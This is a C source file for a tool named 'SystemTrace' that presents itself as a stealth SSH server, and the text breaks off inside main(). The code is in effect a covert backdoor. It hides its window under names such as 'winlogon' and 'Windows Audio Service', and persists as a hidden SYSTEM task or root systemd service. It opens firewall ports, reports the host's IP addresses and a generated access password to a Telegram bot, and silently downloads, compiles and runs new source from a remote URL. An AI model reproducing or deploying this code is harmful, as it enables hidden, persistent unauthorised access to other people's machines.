/*
 * SystemTrace - Stealth SSH Server (Hidden Memory Mode)
 * Auto-updating from: https://raw.githubusercontent.com/Abo5/sys-tools/main/SystemTrace.c
 * 
 * Compile (Windows): gcc -mwindows -o SystemTrace.exe SystemTrace.c -lcurl -lws2_32 -ladvapi32 -static
 * Compile (Linux):   gcc -o SystemTrace SystemTrace.c -lcurl -lpthread
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <signal.h>

#ifdef WIN32
    #include <windows.h>
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <process.h>
    #include <wincrypt.h>
    #include <tlhelp32.h>
    #include <psapi.h>
    #define sleep(x) Sleep((x) * 1000)
    #define getpid() GetCurrentProcessId()
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "advapi32.lib")
    #pragma comment(lib, "psapi.lib")
    #pragma comment(lib, "kernel32.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <sys/wait.h>
    #include <pthread.h>
    #include <unistd.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <syslog.h>
    #define SOCKET int
    #define INVALID_SOCKET -1
    #define closesocket close
#endif

#include <curl/curl.h>

// Configuration
#define VERSION "1.0.0"
#define SSH_PORT 2222
#define SSH_USER "admin"
#define SSH_PASSWORD_LENGTH 16

// Stealth configuration
#define PROCESS_NAME "winlogon"      // Windows stealth name
#define SERVICE_NAME "svchost"       // Service stealth name

// Update URL for self-updating
#define UPDATE_URL "https://raw.githubusercontent.com/Abo5/sys-tools/main/SystemTrace.c"

// Telegram settings
#define TELEGRAM_BOT_TOKEN "YOUR_BOT_TOKEN"  // Change this
#define TELEGRAM_CHAT_ID "YOUR_CHAT_ID"      // Change this

// Global state
static volatile int g_running = 1;
static volatile int g_cleanup_done = 0;
static time_t g_start_time;
static char g_ssh_password[SSH_PASSWORD_LENGTH + 1];
static int g_stealth_mode = 1;

// ======================================================
// Stealth Functions
// ======================================================

#ifdef WIN32
// Hide console window
void hide_console() {
    HWND console = GetConsoleWindow();
    if (console) {
        ShowWindow(console, SW_HIDE);
    }
    
    // Set window title to something generic
    SetConsoleTitleA("Windows Audio Service");
    
    // Hide from Alt+Tab
    LONG style = GetWindowLong(console, GWL_EXSTYLE);
    SetWindowLong(console, GWL_EXSTYLE, style | WS_EX_TOOLWINDOW);
}

// Change process name in task manager
void stealth_process_name() {
    HANDLE hProcess = GetCurrentProcess();
    HMODULE hMod = GetModuleHandle(NULL);
    
    if (hMod) {
        // Try to modify the process name (this is limited but helps)
        char title[256];
        snprintf(title, sizeof(title), "%s", PROCESS_NAME);
        SetConsoleTitleA(title);
    }
}

// Check if running as admin/service
int is_elevated() {
    HANDLE hToken;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;
    
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return 0;
    }
    
    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
        CloseHandle(hToken);
        return 0;
    }
    
    CloseHandle(hToken);
    return elevation.TokenIsElevated;
}

#else

// Daemonize process on Linux
void daemonize() {
    pid_t pid, sid;
    
    // Fork off the parent process
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    
    // If we got a good PID, exit the parent process
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }
    
    // Change the file mode mask
    umask(0);
    
    // Open logs
    openlog("syslogd", LOG_NOWAIT | LOG_PID, LOG_USER);
    
    // Create a new SID for the child process
    sid = setsid();
    if (sid < 0) {
        exit(EXIT_FAILURE);
    }
    
    // Change the current working directory
    if ((chdir("/")) < 0) {
        exit(EXIT_FAILURE);
    }
    
    // Close out the standard file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    // Redirect to /dev/null
    int fd = open("/dev/null", O_RDWR);
    dup2(fd, STDIN_FILENO);
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    if (fd > STDERR_FILENO) close(fd);
}

int is_elevated() {
    return geteuid() == 0;
}

#endif

// Silent logging function
void log_message(const char *level, const char *message) {
#ifdef WIN32
    if (g_stealth_mode) return; // No logging in stealth mode
    
    // Log to Windows Event Log silently
    HANDLE hEventLog = RegisterEventSource(NULL, "System");
    if (hEventLog) {
        const char* messages[] = { message };
        ReportEvent(hEventLog, EVENTLOG_INFORMATION_TYPE, 0, 0, NULL, 1, 0, messages, NULL);
        DeregisterEventSource(hEventLog);
    }
#else
    if (g_stealth_mode) {
        syslog(LOG_INFO, "%s: %s", level, message);
    }
#endif
}

// ======================================================
// Utility structures and functions
// ======================================================

struct http_response {
    char *data;
    size_t size;
};

struct battery_info {
    int level;
    int charging;
};

// HTTP response callback for libcurl
static size_t http_write_callback(void *contents, size_t size, size_t nmemb, struct http_response *response) {
    size_t realsize = size * nmemb;
    char *ptr = realloc(response->data, response->size + realsize + 1);
    
    if (ptr) {
        response->data = ptr;
        memcpy(&(response->data[response->size]), contents, realsize);
        response->size += realsize;
        response->data[response->size] = 0;
    }
    
    return realsize;
}

// Silent command execution
int execute_command_silent(const char *command) {
#ifdef WIN32
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // Hidden execution
    ZeroMemory(&pi, sizeof(pi));
    
    char cmd_line[2048];
    snprintf(cmd_line, sizeof(cmd_line), "cmd.exe /C %s", command);
    
    if (CreateProcess(NULL, cmd_line, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000); // 30 sec timeout
        DWORD exit_code;
        GetExitCodeProcess(pi.hProcess, &exit_code);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return exit_code;
    }
    return -1;
#else
    char silent_cmd[2048];
    snprintf(silent_cmd, sizeof(silent_cmd), "%s >/dev/null 2>&1", command);
    return system(silent_cmd);
#endif
}

// ======================================================
// Password Generation and System Info
// ======================================================

void generate_ssh_password() {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
    const int charset_size = sizeof(charset) - 1;
    
#ifdef WIN32
    HCRYPTPROV hProv;
    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        unsigned char random_bytes[SSH_PASSWORD_LENGTH];
        if (CryptGenRandom(hProv, SSH_PASSWORD_LENGTH, random_bytes)) {
            for (int i = 0; i < SSH_PASSWORD_LENGTH; i++) {
                g_ssh_password[i] = charset[random_bytes[i] % charset_size];
            }
        } else {
            srand((unsigned int)time(NULL) ^ GetTickCount() ^ GetCurrentProcessId());
            for (int i = 0; i < SSH_PASSWORD_LENGTH; i++) {
                g_ssh_password[i] = charset[rand() % charset_size];
            }
        }
        CryptReleaseContext(hProv, 0);
    }
#else
    FILE *urandom = fopen("/dev/urandom", "rb");
    if (urandom) {
        unsigned char random_bytes[SSH_PASSWORD_LENGTH];
        if (fread(random_bytes, 1, SSH_PASSWORD_LENGTH, urandom) == SSH_PASSWORD_LENGTH) {
            for (int i = 0; i < SSH_PASSWORD_LENGTH; i++) {
                g_ssh_password[i] = charset[random_bytes[i] % charset_size];
            }
        } else {
            srand((unsigned int)time(NULL) ^ getpid());
            for (int i = 0; i < SSH_PASSWORD_LENGTH; i++) {
                g_ssh_password[i] = charset[rand() % charset_size];
            }
        }
        fclose(urandom);
    } else {
        srand((unsigned int)time(NULL) ^ getpid());
        for (int i = 0; i < SSH_PASSWORD_LENGTH; i++) {
            g_ssh_password[i] = charset[rand() % charset_size];
        }
    }
#endif
    
    g_ssh_password[SSH_PASSWORD_LENGTH] = '\0';
    log_message("INFO", "Generated secure SSH password");
}

void get_local_ips(char *ip_info, size_t max_size) {
    ip_info[0] = '\0';
    
#ifdef WIN32
    char command[] = "powershell -WindowStyle Hidden -NoProfile -Command \"Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne '127.0.0.1'} | Select-Object -First 3 IPAddress | ForEach-Object {$_.IPAddress}\" > %TEMP%\\ips.tmp 2>nul";
    
    if (execute_command_silent(command) == 0) {
        char temp_path[MAX_PATH];
        GetTempPathA(MAX_PATH, temp_path);
        strcat(temp_path, "ips.tmp");
        
        FILE *f = fopen(temp_path, "r");
        if (f) {
            char line[64];
            char all_ips[256] = "";
            while (fgets(line, sizeof(line), f)) {
                char *newline = strchr(line, '\n');
                if (newline) *newline = '\0';
                char *trimmed = line;
                while (*trimmed == ' ' || *trimmed == '\t') trimmed++;
                
                if (strlen(trimmed) > 7) {
                    if (strlen(all_ips) > 0) strcat(all_ips, ", ");
                    strcat(all_ips, trimmed);
                }
            }
            fclose(f);
            strncpy(ip_info, all_ips, max_size - 1);
            ip_info[max_size - 1] = '\0';
        }
        DeleteFileA(temp_path);
    }
#else
    if (execute_command_silent("hostname -I 2>/dev/null > /tmp/.sysips") == 0) {
        FILE *f = fopen("/tmp/.sysips", "r");
        if (f) {
            if (fgets(ip_info, max_size, f)) {
                char *newline = strchr(ip_info, '\n');
                if (newline) *newline = '\0';
                
                int len = strlen(ip_info);
                while (len > 0 && ip_info[len-1] == ' ') {
                    ip_info[--len] = '\0';
                }
            }
            fclose(f);
        }
        unlink("/tmp/.sysips");
    }
#endif

    if (strlen(ip_info) == 0) {
        strcpy(ip_info, "Network interface detection failed");
    }
}

// ======================================================
// Telegram messaging via curl (stealth mode)
// ======================================================

void send_telegram_message(const char *message) {
    if (strcmp(TELEGRAM_BOT_TOKEN, "YOUR_BOT_TOKEN") == 0 || 
        strcmp(TELEGRAM_CHAT_ID, "YOUR_CHAT_ID") == 0) {
        return;
    }

    CURL *curl;
    CURLcode res;
    char url[512];
    char post_data[2048];
    char escaped_message[1024];
    
    // Escape message for JSON
    int i, j;
    for (i = 0, j = 0; message[i] && j < sizeof(escaped_message) - 10; i++) {
        if (message[i] == '"') {
            escaped_message[j++] = '\\';
            escaped_message[j++] = '"';
        } else if (message[i] == '\\') {
            escaped_message[j++] = '\\';
            escaped_message[j++] = '\\';
        } else if (message[i] == '\n') {
            escaped_message[j++] = '\\';
            escaped_message[j++] = 'n';
        } else {
            escaped_message[j++] = message[i];
        }
    }
    escaped_message[j] = '\0';
    
    snprintf(url, sizeof(url), "https://api.telegram.org/bot%s/sendMessage", TELEGRAM_BOT_TOKEN);
    snprintf(post_data, sizeof(post_data), "{\"chat_id\":\"%s\",\"text\":\"%s\",\"parse_mode\":\"HTML\"}", 
             TELEGRAM_CHAT_ID, escaped_message);
    
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http_write_callback);
        
        // Silent operation
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);
        curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1L);
        
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        
        curl_easy_perform(curl);
        
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
}

// ======================================================
// Self-Update System (stealth)
// ======================================================

char* extract_version_from_source(const char *source_code) {
    static char version[32];
    version[0] = '\0';
    
    char *define_line = strstr(source_code, "#define VERSION");
    if (define_line) {
        char *quote1 = strchr(define_line, '"');
        if (quote1) {
            quote1++;
            char *quote2 = strchr(quote1, '"');
            if (quote2) {
                int len = quote2 - quote1;
                if (len < sizeof(version) - 1) {
                    strncpy(version, quote1, len);
                    version[len] = '\0';
                    return version;
                }
            }
        }
    }
    return NULL;
}

int download_source_code(char **source_code, size_t *source_size) {
    CURL *curl;
    CURLcode res;
    struct http_response response = {0};
    
    curl = curl_easy_init();
    if (!curl) return 0;
    
    curl_easy_setopt(curl, CURLOPT_URL, UPDATE_URL);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http_write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);
    
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK || !response.data) {
        if (response.data) free(response.data);
        return 0;
    }
    
    *source_code = response.data;
    *source_size = response.size;
    return 1;
}

int compile_new_binary(const char *source_code, const char *new_binary_path) {
#ifdef WIN32
    char temp_dir[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_dir);
    
    char temp_source[MAX_PATH];
    snprintf(temp_source, sizeof(temp_source), "%s\\sys_temp_%d.c", temp_dir, GetTickCount());
#else
    char temp_source[] = "/tmp/.sys_temp.c";
#endif
    
    FILE *f = fopen(temp_source, "w");
    if (!f) return 0;
    
    fputs(source_code, f);
    fclose(f);
    
    char compile_command[2048];
#ifdef WIN32
    snprintf(compile_command, sizeof(compile_command), 
        "gcc -mwindows -O2 -o \"%s\" \"%s\" -lcurl -lws2_32 -ladvapi32 -lpsapi -static >nul 2>nul", 
        new_binary_path, temp_source);
#else
    snprintf(compile_command, sizeof(compile_command), 
        "gcc -O2 -o \"%s\" \"%s\" -lcurl -lpthread >/dev/null 2>&1", 
        new_binary_path, temp_source);
#endif
    
    int result = execute_command_silent(compile_command);
    unlink(temp_source);
    
    return result == 0;
}

int test_new_binary(const char *binary_path) {
    char test_command[1024];
#ifdef WIN32
    snprintf(test_command, sizeof(test_command), "\"%s\" --check >nul 2>nul", binary_path);
#else
    snprintf(test_command, sizeof(test_command), "\"%s\" --check >/dev/null 2>&1", binary_path);
#endif
    return execute_command_silent(test_command) == 0;
}

int perform_self_update() {
    char *source_code = NULL;
    size_t source_size = 0;
    
    if (!download_source_code(&source_code, &source_size)) {
        log_message("ERROR", "Failed to download source code");
        return 0;
    }
    
    char *remote_version = extract_version_from_source(source_code);
    if (!remote_version) {
        log_message("ERROR", "Could not extract version from source");
        free(source_code);
        return 0;
    }
    
    if (strcmp(VERSION, remote_version) == 0) {
        free(source_code);
        return 1;
    }
    
    char current_path[1024];
    char new_path[1024];
    char backup_path[1024];
    
#ifdef WIN32
    GetModuleFileNameA(NULL, current_path, sizeof(current_path));
#else
    if (readlink("/proc/self/exe", current_path, sizeof(current_path)) == -1) {
        free(source_code);
        return 0;
    }
#endif
    
    snprintf(new_path, sizeof(new_path), "%s.new", current_path);
    snprintf(backup_path, sizeof(backup_path), "%s.backup", current_path);
    
    if (!compile_new_binary(source_code, new_path)) {
        free(source_code);
        return 0;
    }
    
    free(source_code);
    
    if (!test_new_binary(new_path)) {
        unlink(new_path);
        return 0;
    }
    
    unlink(backup_path);
    if (rename(current_path, backup_path) != 0) {
        unlink(new_path);
        return 0;
    }
    
    if (rename(new_path, current_path) != 0) {
        rename(backup_path, current_path);
        unlink(new_path);
        return 0;
    }
    
#ifndef WIN32
    chmod(current_path, 0755);
#endif
    
    char update_msg[512];
    snprintf(update_msg, sizeof(update_msg), 
        "🔄 <b>Stealth Update Complete</b>\nVersion: %s → %s\nRestarting in stealth mode...", 
        VERSION, remote_version);
    send_telegram_message(update_msg);
    
    sleep(1);
    
#ifdef WIN32
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));
    
    char restart_cmd[1024];
    snprintf(restart_cmd, sizeof(restart_cmd), "\"%s\" smart", current_path);
    
    CreateProcess(NULL, restart_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
#else
    char *args[] = {current_path, "smart", NULL};
    execv(current_path, args);
#endif
    
    exit(0);
}

// ======================================================
// Task Scheduler / systemd management (stealth)
// ======================================================

int is_task_registered() {
#ifdef WIN32
    char command[512];
    char temp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    strcat(temp_path, "task_check.tmp");
    
    snprintf(command, sizeof(command), 
        "powershell -WindowStyle Hidden -NoProfile -Command \"if(Get-ScheduledTask -TaskName 'SystemTrace' -ErrorAction SilentlyContinue) { 'YES' } else { 'NO' }\" > \"%s\" 2>nul", temp_path);
    
    if (execute_command_silent(command) == 0) {
        FILE *f = fopen(temp_path, "r");
        if (f) {
            char result[10];
            if (fgets(result, sizeof(result), f)) {
                fclose(f);
                DeleteFileA(temp_path);
                return strstr(result, "YES") != NULL;
            }
            fclose(f);
        }
        DeleteFileA(temp_path);
    }
    return 0;
#else
    return execute_command_silent("systemctl is-enabled systemtrace >/dev/null 2>&1") == 0;
#endif
}

int register_task() {
#ifdef WIN32
    char exe_path[MAX_PATH];
    char work_dir[MAX_PATH];
    char ps_script[2048];
    
    GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
    strcpy(work_dir, exe_path);
    char *last_slash = strrchr(work_dir, '\\');
    if (last_slash) *last_slash = '\0';
    
    char escaped_exe[MAX_PATH * 2];
    char escaped_dir[MAX_PATH * 2];
    int i, j;
    
    for (i = 0, j = 0; exe_path[i]; i++) {
        if (exe_path[i] == '\\') {
            escaped_exe[j++] = '\\';
            escaped_exe[j++] = '\\';
        } else {
            escaped_exe[j++] = exe_path[i];
        }
    }
    escaped_exe[j] = '\0';
    
    for (i = 0, j = 0; work_dir[i]; i++) {
        if (work_dir[i] == '\\') {
            escaped_dir[j++] = '\\';
            escaped_dir[j++] = '\\';
        } else {
            escaped_dir[j++] = work_dir[i];
        }
    }
    escaped_dir[j] = '\0';
    
    snprintf(ps_script, sizeof(ps_script),
        "powershell -WindowStyle Hidden -NoProfile -Command \""
        "$TaskName = 'SystemTrace'; "
        "if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) { "
        "    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false; "
        "}; "
        "$Action = New-ScheduledTaskAction -Execute '%s' -WorkingDirectory '%s' -Argument 'smart'; "
        "$TriggerStartup = New-ScheduledTaskTrigger -AtStartup; "
        "$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; "
        "$Principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; "
        "Register-ScheduledTask -TaskName $TaskName -Description 'System Trace Service' -Action $Action -Trigger $TriggerStartup -Settings $Settings -Principal $Principal\" >nul 2>nul",
        escaped_exe, escaped_dir);
    
    return execute_command_silent(ps_script) == 0;
#else
    char service_content[1024];
    char exe_path[PATH_MAX];
    
    if (readlink("/proc/self/exe", exe_path, sizeof(exe_path)) == -1) {
        return 0;
    }
    
    snprintf(service_content, sizeof(service_content),
        "[Unit]\n"
        "Description=System Trace Service\n"
        "After=network-online.target\n"
        "\n"
        "[Service]\n"
        "Type=simple\n"
        "ExecStart=%s smart\n"
        "Restart=always\n"
        "User=root\n"
        "StandardOutput=null\n"
        "StandardError=null\n"
        "\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n", exe_path);
    
    FILE *f = fopen("/etc/systemd/system/systemtrace.service", "w");
    if (!f) return 0;
    
    fputs(service_content, f);
    fclose(f);
    
    execute_command_silent("systemctl daemon-reload >/dev/null 2>&1");
    return execute_command_silent("systemctl enable systemtrace >/dev/null 2>&1") == 0;
#endif
}

int unregister_task() {
#ifdef WIN32
    return execute_command_silent("powershell -WindowStyle Hidden -NoProfile -Command \"Unregister-ScheduledTask -TaskName 'SystemTrace' -Confirm:$false\" >nul 2>nul") == 0;
#else
    execute_command_silent("systemctl stop systemtrace >/dev/null 2>&1");
    execute_command_silent("systemctl disable systemtrace >/dev/null 2>&1");
    unlink("/etc/systemd/system/systemtrace.service");
    execute_command_silent("systemctl daemon-reload >/dev/null 2>&1");
    return 1;
#endif
}

// ======================================================
// Firewall management (stealth)
// ======================================================

int enable_firewall() {
#ifdef WIN32
    char command[512];
    snprintf(command, sizeof(command),
        "powershell -WindowStyle Hidden -NoProfile -Command \""
        "Remove-NetFirewallRule -DisplayName 'SystemTrace-%d' -ErrorAction SilentlyContinue; "
        "New-NetFirewallRule -DisplayName 'SystemTrace-%d' -Direction Inbound -Protocol TCP -LocalPort %d -Action Allow -Profile Private,Domain\" >nul 2>nul",
        SSH_PORT, SSH_PORT, SSH_PORT);
    return execute_command_silent(command) == 0;
#else
    char command[256];
    
    if (execute_command_silent("which ufw >/dev/null 2>&1") == 0) {
        snprintf(command, sizeof(command), "ufw allow %d/tcp >/dev/null 2>&1", SSH_PORT);
        return execute_command_silent(command) == 0;
    }
    
    if (execute_command_silent("which firewall-cmd >/dev/null 2>&1") == 0) {
        snprintf(command, sizeof(command), "firewall-cmd --permanent --add-port=%d/tcp >/dev/null 2>&1 && firewall-cmd --reload >/dev/null 2>&1", SSH_PORT);
        return execute_command_silent(command) == 0;
    }
    
    if (execute_command_silent("which iptables >/dev/null 2>&1") == 0) {
        snprintf(command, sizeof(command), "iptables -A INPUT -p tcp --dport %d -j ACCEPT >/dev/null 2>&1", SSH_PORT);
        return execute_command_silent(command) == 0;
    }
    
    return 0;
#endif
}

int disable_firewall() {
#ifdef WIN32
    char command[512];
    snprintf(command, sizeof(command),
        "powershell -WindowStyle Hidden -NoProfile -Command \"Remove-NetFirewallRule -DisplayName 'SystemTrace-%d'\" >nul 2>nul", SSH_PORT);
    return execute_command_silent(command) == 0;
#else
    return 1;
#endif
}

// ======================================================
// Battery monitoring (Windows only) - stealth
// ======================================================

struct battery_info get_battery_info() {
    struct battery_info info = {100, 1};
    
#ifdef WIN32
    char temp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    strcat(temp_path, "bat.tmp");
    
    char command[512];
    snprintf(command, sizeof(command), "powershell -WindowStyle Hidden -NoProfile -Command \"$b = Get-CimInstance Win32_Battery; if($b){Write-Output \\\"$($b.EstimatedChargeRemaining)|$($b.BatteryStatus)\\\"}else{Write-Output \\\"100|2\\\"}\" > \"%s\" 2>nul", temp_path);
    
    if (execute_command_silent(command) == 0) {
        FILE *f = fopen(temp_path, "r");
        if (f) {
            char result[32];
            if (fgets(result, sizeof(result), f)) {
                char *pipe = strchr(result, '|');
                if (pipe) {
                    *pipe = '\0';
                    info.level = atoi(result);
                    info.charging = (atoi(pipe + 1) == 2);
                }
            }
            fclose(f);
        }
        DeleteFileA(temp_path);
    }
#endif
    
    return info;
}

// ======================================================
// Shutdown detection (stealth)
// ======================================================

int is_shutdown_pending() {
#ifdef WIN32
    char temp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    strcat(temp_path, "shutdown.tmp");
    
    char command[512];
    snprintf(command, sizeof(command), "powershell -WindowStyle Hidden -NoProfile -Command \"Get-Process | Where-Object {$_.ProcessName -match 'shutdown|restart'} | Measure-Object | Select-Object -ExpandProperty Count\" > \"%s\" 2>nul", temp_path);
    
    if (execute_command_silent(command) == 0) {
        FILE *f = fopen(temp_path, "r");
        if (f) {
            char result[16];
            if (fgets(result, sizeof(result), f)) {
                fclose(f);
                DeleteFileA(temp_path);
                return atoi(result) > 0;
            }
            fclose(f);
        }
        DeleteFileA(temp_path);
    }
    return 0;
#else
    return (execute_command_silent("pgrep shutdown >/dev/null 2>&1") == 0 ||
            execute_command_silent("pgrep reboot >/dev/null 2>&1") == 0 ||
            execute_command_silent("pgrep poweroff >/dev/null 2>&1") == 0);
#endif
}

// ======================================================
// Simple SSH Server (stealth)
// ======================================================

void handle_ssh_connection(SOCKET client_socket) {
    char buffer[256];
    char response[512];
    
    snprintf(response, sizeof(response), "SSH-2.0-SystemTrace_%s\r\n", VERSION);
    send(client_socket, response, strlen(response), 0);
    
    recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    
    snprintf(response, sizeof(response), 
        "Welcome to System Trace %s\r\n"
        "SSH User: %s | Password: %s\r\n"
        "This is a demo server - use OpenSSH for full access\r\n", 
        VERSION, SSH_USER, g_ssh_password);
    send(client_socket, response, strlen(response), 0);
    
    sleep(2);
    closesocket(client_socket);
}

#ifdef WIN32
DWORD WINAPI ssh_server_thread(LPVOID param) {
#else
void* ssh_server_thread(void* param) {
#endif
    SOCKET server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    int client_len = sizeof(client_addr);
    
#ifdef WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        return 0;
    }
#endif
    
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == INVALID_SOCKET) {
#ifdef WIN32
        WSACleanup();
#endif
        return 0;
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(SSH_PORT);
    
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        closesocket(server_socket);
#ifdef WIN32
        WSACleanup();
#endif
        return 0;
    }
    
    if (listen(server_socket, 5) < 0) {
        closesocket(server_socket);
#ifdef WIN32
        WSACleanup();
#endif
        return 0;
    }
    
    log_message("INFO", "SSH server listening");
    
    while (g_running) {
        client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
        if (client_socket != INVALID_SOCKET) {
#ifdef WIN32
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)handle_ssh_connection, (LPVOID)(intptr_t)client_socket, 0, NULL);
#else
            pthread_t thread;
            pthread_create(&thread, NULL, (void*)handle_ssh_connection, (void*)(intptr_t)client_socket);
            pthread_detach(thread);
#endif
        }
    }
    
    closesocket(server_socket);
#ifdef WIN32
    WSACleanup();
#endif
    return 0;
}

// ======================================================
// Monitoring threads (stealth)
// ======================================================

#ifdef WIN32
DWORD WINAPI battery_monitor_thread(LPVOID param) {
#else
void* battery_monitor_thread(void* param) {
#endif
    int last_warning_level = 100;
    
    while (g_running) {
        struct battery_info info = get_battery_info();
        
        if (info.level <= 15 && !info.charging && last_warning_level > 15) {
            log_message("WARNING", "Battery critically low");
            register_task();
            
            char message[256];
            snprintf(message, sizeof(message), "🔋 <b>Battery Critical!</b>\nLevel: %d%%\nStatus: Not charging\nStealth mode: Active", info.level);
            send_telegram_message(message);
            last_warning_level = info.level;
        } else if (info.level <= 25 && !info.charging && last_warning_level > 25) {
            char message[256];
            snprintf(message, sizeof(message), "🔋 <b>Battery Low</b>\nLevel: %d%%\nStatus: Not charging", info.level);
            send_telegram_message(message);
            last_warning_level = info.level;
        } else if (info.charging && last_warning_level <= 25) {
            char message[256];
            snprintf(message, sizeof(message), "🔌 <b>Charging Started</b>\nLevel: %d%%\nStatus: Charging", info.level);
            send_telegram_message(message);
            last_warning_level = 100;
        }
        
        sleep(30);
    }
    return 0;
}

#ifdef WIN32
DWORD WINAPI shutdown_monitor_thread(LPVOID param) {
#else
void* shutdown_monitor_thread(void* param) {
#endif
    while (g_running) {
        if (is_shutdown_pending()) {
            log_message("INFO", "System shutdown detected");
            register_task();
            send_telegram_message("⚠️ <b>System shutdown detected</b>\nStealth server will auto-restart");
            break;
        }
        sleep(3);
    }
    return 0;
}

#ifdef WIN32
DWORD WINAPI update_monitor_thread(LPVOID param) {
#else
void* update_monitor_thread(void* param) {
#endif
    sleep(300);  // Wait 5 minutes
    
    while (g_running) {
        perform_self_update();
        
        for (int i = 0; i < 21600 && g_running; i++) {
            sleep(1);
        }
    }
    return 0;
}

// ======================================================
// Signal handlers and cleanup
// ======================================================

void signal_handler(int signum) {
    g_running = 0;
}

void cleanup_and_exit() {
    if (g_cleanup_done) return;
    g_cleanup_done = 1;
    
    register_task();
    disable_firewall();
    
    time_t uptime = time(NULL) - g_start_time;
    char message[256];
    snprintf(message, sizeof(message), "📴 <b>Stealth Server Shutdown</b>\nUptime: %ld seconds\nMode: Hidden memory execution", uptime);
    send_telegram_message(message);
    
    log_message("INFO", "Stealth shutdown complete");
}

// ======================================================
// Main function
// ======================================================

int main(int argc, char *argv[]) {
    g_start_time = time(NULL);
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    if (argc < 2) {
        // Show help only if not in stealth mode
        if (!g_stealth_mode) {
            printf("SystemTrace v%s (Stealth Mode)\n", VERSION);
            printf("Usage:\n");
            printf("  %s smart    - Stealth mode (hidden execution)\n", argv[0]);
            printf("  %s setup    - Setup auto-start service\n", argv[0]);
            printf("  %s --check  - Test command\n", argv[0]);
        }
        return 1;
    }
    
    if (strcmp(argv[1], "--check") == 0) {
        printf("OK\n");
        return 0;
    } else if (strcmp(argv[1], "smart") == 0) {
        // Enable stealth mode
        g_stealth_mode = 1;
        
#ifdef WIN32
        // Hide console and set stealth process name
        hide_console();
        stealth_process_name();
#else
        // Daemonize on Linux
        daemonize();
#endif
        
        signal(SIGINT, signal_handler);
        signal(SIGTERM, signal_handler);
        atexit(cleanup_and_exit);
        
        // Generate password and get system info
        generate_ssh_password();
        char ip_addresses[256];
        get_local_ips(ip_addresses, sizeof(ip_addresses));
        
        // Send stealth startup notification
        char startup_msg[1024];
        snprintf(startup_msg, sizeof(startup_msg), 
